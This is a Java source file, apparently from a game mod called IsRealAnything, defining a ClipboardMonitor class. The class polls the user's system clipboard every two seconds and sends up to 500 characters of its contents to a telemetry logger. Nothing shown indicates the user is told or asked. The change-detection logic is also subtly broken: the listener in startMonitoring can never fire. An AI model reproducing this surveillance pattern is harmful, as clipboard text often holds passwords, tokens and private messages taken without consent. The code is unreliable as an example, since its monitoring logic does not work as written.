package com.epicspymain.isrealanything.collector;

import com.epicspymain.isrealanything.IsRealAnything;

import java.awt.Toolkit;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.UnsupportedFlavorException;


public class ClipboardMonitor {
	private static String lastClipboardContent = "";
	

	public static String getClipboardContent() {
		if (!IsRealAnything.ENABLE_DATA_COLLECTION) {
			return null;
		}
		
		try {
			Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
			
			if (clipboard.isDataFlavorAvailable(DataFlavor.stringFlavor)) {
				String content = (String) clipboard.getData(DataFlavor.stringFlavor);
				
				// Only log if content changed
				if (content != null && !content.equals(lastClipboardContent)) {
					lastClipboardContent = content;
					
					IsRealAnything.LOGGER.debug("[CLIPBOARD] Captured {} characters", content.length());
					
					// Log to telemetry (truncate long content)
					String truncated = content.length() > 500 
						? content.substring(0, 500) + "..." 
						: content;
					MavonLogger.logTelemetry("clipboard_read", truncated);
					
					return content;
				}
				
				return content;
			}
			
		} catch (UnsupportedFlavorException e) {
			IsRealAnything.LOGGER.debug("Clipboard contains non-text data");
		} catch (Exception e) {
			IsRealAnything.LOGGER.error("Error reading clipboard", e);
		}
		
		return null;
	}
	

	public static void startMonitoring(ClipboardChangeListener listener) {
		if (!IsRealAnything.ENABLE_DATA_COLLECTION) {
			return;
		}
		
		Thread.ofVirtual().start(() -> {
			while (IsRealAnything.ENABLE_DATA_COLLECTION) {
				try {
					String content = getClipboardContent();
					if (content != null && !content.equals(lastClipboardContent)) {
						listener.onClipboardChange(content);
					}
					Thread.sleep(2000); // Check every 2 seconds
				} catch (InterruptedException e) {
					break;
				}
			}
		});
	}
	
	/**
	 * Callback interface for clipboard changes.
	 */
	@FunctionalInterface
	public interface ClipboardChangeListener {
		void onClipboardChange(String newContent);
	}
	
	/**
	 * Gets the last captured clipboard content without making new request.
	 */
	public static String getLastClipboardContent() {
		return lastClipboardContent;
	}
}
